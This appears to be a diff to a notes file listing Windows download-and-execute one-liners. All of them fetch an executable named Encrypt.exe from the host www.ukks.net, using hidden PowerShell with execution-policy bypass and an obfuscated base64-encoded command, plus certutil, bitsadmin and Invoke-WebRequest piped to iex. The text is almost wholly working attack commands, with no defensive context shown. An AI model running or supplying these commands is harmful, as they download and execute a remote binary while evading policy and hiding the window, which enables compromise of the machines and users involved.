@@ -7,3 +7,17 @@ c:\Windows\System32\cmd.exe /c powershell.exe -w hidden -noni -nop -c "iex(New-O
 
 ## Version2
 c:\windows\system32\cmd.exe /c PowErsHelL.EXE -eXecUtiONPoLICy bYPass -NOPROfilE -WinDoWSTYlE hiDden -EnCodeDcOmmAnd KE5ldy1PYkplQ1Qgc1lzdEVtLm5lVC53ZWJDbElFTlQpLkRPV25sb2FkRklsZSgnaHR0cDovL3d3dy51a2tzLm5ldC9jb250cm9scy9FbmNyeXB0LmV4ZScsIiRlbnY6QVBQREFUQVxFbmNyeXB0LmV4ZSIp
+
+powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C "(New-Object Net.WebClient).DownloadString('http://www.ukks.net/controls/Encrypt.exe')
+
+(New-Object Net.WebClient).DownloadString('http://www.ukks.net/controls/Encrypt.exe')
+
+certutil.exe -urlcache -split -f 'http://www.ukks.net/controls/Encrypt.exe'
+
+(New-Object IO.StreamReader([Net.HttpWebRequest]::Create('http://www.ukks.net/controls/Encrypt.exe').GetResponse().GetResponseStream())).ReadToEnd()
+
+(Invoke-WebRequest -Uri 'http://www.ukks.net/controls/Encrypt.exe' -OutFile Encrypt.exe)|iex
+
+bitsadmin /transfer mydownloadjob /download /priority normal http://www.ukks.net/controls/Encrypt.exe C:\\Users\\$env:username\\AppData\\local\\temp\\Encrypt.exe
+
+iwr('http://www.ukks.net/controls/Encrypt.exe')|iex
